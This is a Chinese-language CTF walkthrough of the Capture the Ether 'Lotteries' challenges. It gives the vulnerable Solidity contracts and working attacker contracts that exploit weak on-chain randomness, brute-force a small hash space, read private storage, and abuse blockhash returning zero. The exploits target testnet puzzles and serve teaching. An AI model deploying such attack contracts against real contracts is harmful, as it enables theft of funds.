# Lotteries

Feeling lucky? These challenges will show how hard it is to run a fair lottery.

------

参考：https://www.anquanke.com/post/id/154104



## Guess the number

### 1.题目要求

I’m thinking of a number. All you have to do is guess it.

```solidity
pragma solidity ^0.4.21;

contract GuessTheNumberChallenge {
    uint8 answer = 42;

    function GuessTheNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

### 2.题解

这是最简单的，直接把answer给出来了，那么我们直接调用guess函数并传参42即可，同时注意需要发送1 ether，这样就可以把创建合约时存进去的1 ether提取出来

![img](https://p2.ssl.qhimg.com/t01a17e3bdfbec8c6ea.jpg)



## Guess the secret number

### 1.题目要求

Putting the answer in the code makes things a little too easy.

This time I’ve only stored the hash of the number. Good luck reversing a cryptographic hash!



将答案放在代码中会使事情变得过于简单。

这次我只存储了数字的哈希值。祝你好运逆转加密散列！

```solidity
pragma solidity ^0.4.21;

contract GuessTheSecretNumberChallenge {
    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;

    function GuessTheSecretNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }
    
    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        if (keccak256(n) == answerHash) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

### 2.题解

这道题算是上题的进阶版，不过它给出的是一串hash值，我们要完成挑战需要把破解后的数字发送过去，看上去这有点难为人，不过我们发现它给出的参数n的数据类型为uint8，这代表着其长度只有八位，也就是0到255，这样就很简单了，下面是一个简单的爆破合约:

```solidity
contract crack {
    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;
    uint8 public result;

// keccak256() 函数接受一个或多个参数，并将这些参数作为输入进行哈希计算。
// 它返回一个长度为 256 位的哈希值，通常表示为一个 64 个字符的十六进制字符串。
    function crackresult() returns (uint8) {
        for (uint8 i = 0; i <= 255; i++) {
            if (keccak256(i) == answerHash) {
                result = i;
                return i;
            }
        }
    }
}
```

部署一下爆破结果:

![img](https://p3.ssl.qhimg.com/t0126150e126917954c.jpg)

然后提交即可，最后在页面check过关



## Guess the random number

### 1.题目要求

This time the number is generated based on a couple fairly random sources.

这次这个数字是根据几个相当随机的来源生成的。

```solidity
pragma solidity ^0.4.21;

contract GuessTheRandomNumberChallenge {
    uint8 answer;

    function GuessTheRandomNumberChallenge() public payable {
        require(msg.value == 1 ether);
        // block.blockhash(block.number - 1)
        // 获取前一个区块的哈希值
        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```



### 2.题解

这一关又进阶了，answer还是一串hash，但是是在构造函数里进行了初始化，使用了块的hash和时间戳，事实上这些量在目标合约部署以后都是已知的，我们可以直接在创建块的交易信息里查看，不过简单点我们这里直接在storage里读取即可，此处answer的存储位是在slot 0处

```
web3.eth.getStorageAt("0xe3a",0,console.log)

使用Web3.js库中的web3.eth.getStorageAt()方法来获取
以太坊区块链上合约地址为"0xe3a"的存储器（storage）中的值

0：这是存储器的索引或位置。以太坊合约使用存储器来存储持久性数据，存储器可以被看作是合约内部的一个大型字节数组。
在这里，0表示要获取存储器中的第一个位置的值

console.log：这是一个回调函数，用于处理获取到的存储器值。
当web3.eth.getStorageAt()方法成功返回存储器值时，它将调用该回调函数，并将结果作为参数传递给它。
在这里，console.log是一个用于将结果输出到控制台的回调函数。

综上所述，该代码的作用是通过Web3.js库中的web3.eth.getStorageAt()方法从指定合约地址的存储器中获取特定位置
的值，并将结果输出到控制台。
```



因为使用了metamask插件，所以我们的浏览器已经加载了web3.js，所以我们可以直接在控制台里与Ropsten测试链交互:
![img](https://p3.ssl.qhimg.com/t01b3e621cf0bdd46d9.jpg)



可见answer即为0x2f，也就是47.然后按流程提交即可，注意发送交易时需要1 ether

![img](https://p4.ssl.qhimg.com/t0183a51ddc95b5cbc5.jpg)



## Guess the new number

### 1.题目

The number is now generated on-demand when a guess is made.

现在，当进行猜测时，该数字会按需生成。

```solidity
pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```



### 2.题解

核心思想就是要在guess函数执行前知道前一个区块的hash与当前块的时间戳，我们知道每个区块里会包含许多交易，对于这些交易前一区块的hash与时间戳都是相同的，所以我们只要部署另一个合约来调用目标合约的guess函数以使这两个交易在一个块内，攻击合约很简单，如下:



```solidity
pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}


contract attacker {
    function attack() public payable {
        uint8 result = uint8(keccak256(block.blockhash(block.number - 1), now));

      // 创建了一个名为target的合约实例，
      // 并将指定的地址0xE8BE7654f6C8C23026939901b80530dCf0AfCA75传递给构造函数。
      // 然后，使用target实例调用了名为guess的函数，同时向其发送了1以太币的价值，
      // 并将之前计算得到的result作为参数传递给该函数
        GuessTheNewNumberChallenge target = GuessTheNewNumberChallenge(0xE8BE7654f6C8C23026939901b80530dCf0AfCA75);
        target.guess.value(1 ether)(result);
    }

}
```



最好是有个fallback函数以便我们调用attack函数时发送1 ether，接下来就很简单，部署攻击合约以后调用attack函数并发送1 ether

![img](https://p4.ssl.qhimg.com/t01c6c85e4e4b249cf0.jpg)

挑战完成，check进入下一关



## Predict the future

### 1.题目

This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers.

Note that it is indeed possible to solve this challenge without losing any ether.



这一次，您必须在生成随机数之前锁定您的猜测。为了给你一个运动的机会，只有十个可能的答案。

请注意，确实有可能在不损失任何以太币的情况下解决这一挑战。

```solidity
pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```



### 2.题解

这题也有点意思，随机数的生成方式与上一题是一样的，但是它多了个lockInGuess函数，此处我们就需要输入我们guess的值，然后使用settlementBlockNumber限制为我们调用lockInGuess的交易所在区块之后的区块，这样我们就不能在同一个区块里调用lockInGuess与settle函数了，所以这个挑战的名字就叫预测未来

看起来我们要完成挑战就得提前知道后面的区块的信息，这似乎是不可能的，事实上也是不可能的，这里的关键是在于guess的大小为10，也就是0 到 9，这就为我们去爆破它提供了可能，虽然我们无法去就挑战合约的answer，但是我们可以让answer来就我们，反正按照规则一次一次地尝试生成answer，当此块的信息得到的answer与我们猜的guess相同时我们再调用settle函数，以免guesser被清零，我们又得投1 ether进去

所以攻击合约如下



```solidity
contract attacker {

    PredictTheFutureChallenge target;
    uint public result;

    function attacker() public payable {

        target = PredictTheFutureChallenge(address of your challenge);
        target.lockInGuess.value(1 ether)(8);

    }

    function exploit() public payable {
        result = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
            if (result == 8) {
            target.settle();
        }

    }

    function () public payable {

    }
}
```



首先是随便猜个数字，因为锁定用户用的是msg.sender，所以我们必须用攻击合约来完成这一步骤，这里我选择的是8，然后部署攻击合约，注意部署时需要发送1 ether，然后就是拼人品的时候了，反正就一直调用exploit函数，人品好的可能两三次就成功通过了，脸黑的可能得十几次几十次，毕竟平均也得10次，反正每次调用完查看下isComplete看是否成功，可以多给点gas以提高下优先级，多少能省点时间，反正也不是真钱



## Predict the block hash

### 1.题目

Guessing an 8-bit number is apparently too easy. This time, you need to predict the entire 256-bit block hash for a future block.

猜测一个 8 位数字显然太容易了。这一次，您需要预测未来区块的整个 256 位区块哈希。

```solidity
pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```



### 2.题解

这个挑战还是要你预测，代码主体跟前面那个差不多，但是这个直接要你猜当前块的hash，我们知道这是根本不可能的，乍一看确实让人有点懵逼,不过此处的突破点在于block.blockhash这个函数，它可以获取给定的区块号的hash值，但只支持最近的256个区块，不包含当前区块，对于256个区块之前的函数将返回0，知道了这些就好办了，先传递guess为0，然后等待256个区块再调用settle函数即可



不知道该等多久的可以使用web3.eth.getBlockNumber()来方便地获取最近一次的区块号



![img](https://p1.ssl.qhimg.com/t0104a948c24452332c.jpg)
